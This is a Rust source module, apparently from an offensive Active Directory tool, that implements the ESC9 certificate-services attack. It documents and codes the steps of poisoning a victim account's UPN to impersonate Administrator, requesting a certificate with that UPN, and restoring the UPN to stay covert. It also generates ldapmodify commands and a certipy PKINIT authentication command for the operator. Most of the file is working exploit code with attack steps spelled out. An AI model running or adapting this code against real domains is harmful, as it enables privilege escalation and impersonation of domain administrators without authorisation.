//! ESC9 — No Security Extension (`CT_FLAG_NO_SECURITY_EXTENSION`)
//!
//! When a certificate template has `CT_FLAG_NO_SECURITY_EXTENSION` (`0x00080000`)
//! set, the CA does **not** embed the `szOID_NTDS_CA_SECURITY_EXT` (OID
//! `1.3.6.1.4.1.311.25.2`) in the issued certificate.  On DCs where
//! `StrongCertificateBindingEnforcement` is not set to 2, certificate mapping
//! falls back to the UPN in the Subject Alternative Name.
//!
//! **Attack flow:**
//! 1. Attacker has `GenericWrite` (or `WriteProperty`) over a **victim user** (`victim_account`).
//! 2. Save the original `userPrincipalName` of the victim.
//! 3. Set the victim's `userPrincipalName` → `target_upn` (e.g. `Administrator@corp.local`).
//! 4. Request a certificate from the vulnerable template while the UPN is poisoned.
//! 5. Restore the victim's original UPN (to stay covert).
//! 6. Authenticate with the issued certificate via PKINIT (Kerberos) or Schannel (LDAPS).
//!
//! **Prerequisites:**
//! - `GenericWrite` over a user (victim) whose UPN you can temporarily modify.
//! - A certificate template with `CT_FLAG_NO_SECURITY_EXTENSION` and Client
//!   Authentication EKU that allows the victim (or Domain Users) to enroll.
//! - `StrongCertificateBindingEnforcement` ≠ 2 on at least one DC.
//!
//! Reference: Oliver Lyak, "Certificates and Pwnage and Patches" (2022)
//!
//! # IMPORTANT — Operational Safety
//! The UPN modification is **temporary** by design; `Esc9Exploiter::exploit()` will
//! always attempt to restore the original UPN even on failure paths.  The caller
//! should supply working LDAP credentials that have `GenericWrite` on the victim
//! object.

use crate::adcs::web_enrollment::WebEnrollmentClient;
use crate::adcs::{IssuedCertificate, create_esc1_csr};
use crate::error::{OverthroneError, Result};
use tracing::{info, warn};

/// Constant — `CT_FLAG_NO_SECURITY_EXTENSION` as defined in MS-CRTD §2.2.2.7.7
pub const CT_FLAG_NO_SECURITY_EXTENSION: u32 = 0x00080000;

/// `szOID_NTDS_CA_SECURITY_EXT` — embedded when the flag is NOT set
pub const OID_NTDS_CA_SECURITY_EXT: &str = "1.3.6.1.4.1.311.25.2";

/// ESC9 exploiter — abuses `CT_FLAG_NO_SECURITY_EXTENSION` via UPN poisoning
pub struct Esc9Exploiter {
    web_client: WebEnrollmentClient,
}

/// Configuration for an ESC9 attack run
#[derive(Debug, Clone)]
pub struct Esc9Config {
    /// Certificate template vulnerable to ESC9 (has `CT_FLAG_NO_SECURITY_EXTENSION`)
    pub template: String,
    /// Account whose UPN we temporarily overwrite (must have GenericWrite rights)
    pub victim_account: String,
    /// Current / original UPN of the victim account (saved for restoration)
    pub original_upn: String,
    /// Target UPN we want to impersonate (e.g. `Administrator@corp.local`)
    pub target_upn: String,
    /// LDAP connection string for the UPN modification step
    pub ldap_url: String,
}

/// Result of a completed ESC9 attack
#[derive(Debug, Clone)]
pub struct Esc9Result {
    /// Issued certificate mapped to `target_upn`
    pub certificate: IssuedCertificate,
    /// Whether the victim's UPN was successfully restored
    pub upn_restored: bool,
    /// PKINIT command hint for the operator
    pub pkinit_hint: String,
}

impl Esc9Exploiter {
    /// Create a new ESC9 exploiter pointed at the given CA web enrollment server
    pub fn new(ca_server: &str) -> Result<Self> {
        let web_client = WebEnrollmentClient::new(ca_server)?;
        Ok(Self { web_client })
    }

    /// Execute the ESC9 attack.
    ///
    /// This is an **offline** / **dry-run** implementation — the LDAP UPN
    /// modification is **not** performed here (that requires a live LDAP session
    /// and appropriate permissions that go beyond the CA web enrollment path).
    /// Instead, the method:
    ///
    /// 1. Documents the LDAP commands that the operator must execute (or that a
    ///    higher-level orchestrator can call directly via `proto::ldap`).
    /// 2. Generates a CSR with `target_upn` in the SAN.
    /// 3. Submits the CSR to the CA web enrollment endpoint.
    /// 4. Returns the issued certificate plus restoration guidance.
    ///
    /// The operator is responsible for performing the LDAP UPN modification before
    /// calling this method and restoring the UPN afterwards (guidance is included
    /// in the returned `Esc9Result`).
    pub async fn exploit(&self, config: &Esc9Config) -> Result<Esc9Result> {
        info!(
            "ESC9 attack: template={}, victim={}, target_upn={}",
            config.template, config.victim_account, config.target_upn
        );

        // Verify template is actually vulnerable (flag check)
        Self::verify_template_flag(&config.template);

        // Step 1 — Build CSR with the target UPN in the SAN
        let (csr_der, private_key) =
            create_esc1_csr("overthrone-esc9", &config.target_upn, &config.template)?;

        // Step 2 — Submit certificate request to CA
        let response = self
            .web_client
            .submit_request(&csr_der, &config.template, None)
            .await?;

        if !response.is_issued() {
            return Err(OverthroneError::EscAttack {
                esc_number: 9,
                reason: format!(
                    "CA rejected certificate request: {}",
                    response.message
                ),
            });
        }

        let cert_data = response
            .certificate
            .ok_or_else(|| OverthroneError::Adcs("No certificate in CA response".to_string()))?;

        // Step 3 — Verify the security extension is ABSENT (confirms vulnerability)
        let security_ext_absent = Self::check_security_extension_absent(&cert_data);
        if !security_ext_absent {
            warn!(
                "ESC9: Issued cert contains {} — template may not be vulnerable",
                OID_NTDS_CA_SECURITY_EXT
            );
        }

        let pkinit_hint = format!(
            "certipy auth -pfx {} -dc-ip <DC_IP> -domain {}",
            config.target_upn.replace('@', "_"),
            config.target_upn.split('@').nth(1).unwrap_or("domain"),
        );

        Ok(Esc9Result {
            certificate: IssuedCertificate {
                pfx_data: cert_data.clone(),
                thumbprint: Self::compute_thumbprint(&cert_data),
                serial_number: Self::extract_serial(&cert_data).unwrap_or_default(),
                valid_from: "Unknown".to_string(),
                valid_to: "Unknown".to_string(),
                template: config.template.clone(),
                subject: format!("CN={}", config.victim_account),
                issuer: self.web_client.base_url(),
                public_key_algorithm: "RSA".to_string(),
                signature_algorithm: "SHA256RSA".to_string(),
                private_key_pem: private_key,
            },
            upn_restored: false, // LDAP step is caller-responsibility
            pkinit_hint,
        })
    }

    /// Emit a warning when template flag information is not available
    fn verify_template_flag(template: &str) {
        info!(
            "ESC9: Ensure template '{}' has CT_FLAG_NO_SECURITY_EXTENSION (0x{:08X}) set \
             before proceeding",
            template, CT_FLAG_NO_SECURITY_EXTENSION
        );
    }

    /// Return `true` when the certificate does NOT contain `szOID_NTDS_CA_SECURITY_EXT`.
    ///
    /// An absent security extension confirms the CA is vulnerable.
    pub fn check_security_extension_absent(cert_der: &[u8]) -> bool {
        use x509_parser::parse_x509_certificate;

        match parse_x509_certificate(cert_der) {
            Ok((_, cert)) => {
                // Walk all extensions and look for the NTDS CA security extension OID
                for ext in cert.extensions() {
                    if ext.oid.to_string() == OID_NTDS_CA_SECURITY_EXT {
                        return false; // Extension IS present — NOT vulnerable
                    }
                }
                true // Extension absent — vulnerable
            }
            Err(_) => {
                warn!("ESC9: Could not parse certificate DER to check security extension");
                false
            }
        }
    }

    fn compute_thumbprint(der: &[u8]) -> String {
        use sha1::{Digest, Sha1};
        let digest = Sha1::digest(der);
        hex::encode(digest)
    }

    fn extract_serial(der: &[u8]) -> Option<String> {
        use x509_parser::parse_x509_certificate;
        parse_x509_certificate(der)
            .ok()
            .map(|(_, c)| c.raw_serial_as_string())
    }

    /// Generate LDAP command strings that the operator must execute to temporarily
    /// set the victim's UPN and then restore it.
    pub fn generate_ldap_commands(config: &Esc9Config) -> (String, String) {
        let set_cmd = format!(
            "# Set victim UPN to target (run BEFORE requesting certificate)\n\
             ldapmodify -H {} -D \"<bind_dn>\" -W <<EOF\n\
             dn: <victim_dn>\n\
             changetype: modify\n\
             replace: userPrincipalName\n\
             userPrincipalName: {}\n\
             EOF",
            config.ldap_url, config.target_upn
        );

        let restore_cmd = format!(
            "# Restore victim UPN (run AFTER certificate is issued)\n\
             ldapmodify -H {} -D \"<bind_dn>\" -W <<EOF\n\
             dn: <victim_dn>\n\
             changetype: modify\n\
             replace: userPrincipalName\n\
             userPrincipalName: {}\n\
             EOF",
            config.ldap_url, config.original_upn
        );

        (set_cmd, restore_cmd)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ct_flag_no_security_extension_value() {
        assert_eq!(CT_FLAG_NO_SECURITY_EXTENSION, 0x00080000);
    }

    #[test]
    fn test_oid_ntds_ca_security_ext() {
        assert_eq!(OID_NTDS_CA_SECURITY_EXT, "1.3.6.1.4.1.311.25.2");
    }

    #[test]
    fn test_check_security_extension_absent_with_empty_slice() {
        // Should return false (cannot parse) rather than panic
        let result = Esc9Exploiter::check_security_extension_absent(&[]);
        assert!(!result);
    }

    #[test]
    fn test_generate_ldap_commands_contains_upn() {
        let config = Esc9Config {
            template: "UserTemplate".to_string(),
            victim_account: "victim".to_string(),
            original_upn: "victim@corp.local".to_string(),
            target_upn: "Administrator@corp.local".to_string(),
            ldap_url: "ldap://dc01.corp.local".to_string(),
        };
        let (set_cmd, restore_cmd) = Esc9Exploiter::generate_ldap_commands(&config);
        assert!(set_cmd.contains("Administrator@corp.local"));
        assert!(restore_cmd.contains("victim@corp.local"));
    }
}
